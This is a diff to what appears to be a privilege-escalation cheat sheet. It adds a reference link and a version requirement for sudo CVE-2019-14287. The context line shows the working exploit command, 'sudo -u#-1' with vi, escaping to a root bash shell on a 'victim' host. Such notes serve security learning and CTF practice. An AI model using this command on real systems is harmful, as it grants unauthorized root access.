@@ -195,6 +195,10 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <h2>sudo - CVE-2019-14287</h2>
 
+Read more: <li>https://hackersploit.org/sudo-security-bypass-vulnerability-cve-2019-14287/</li>
+  
+Requirments: : sudo version <= 1.8.28
+
 <b>hacked-account@victim:~: </b><code>sudo -u#-1 /usr/bin/vi /home/hacked-account/user.txt</code> followed by shift+: <code>!/bin/bash</code>
 
 <h2>bash</h2>
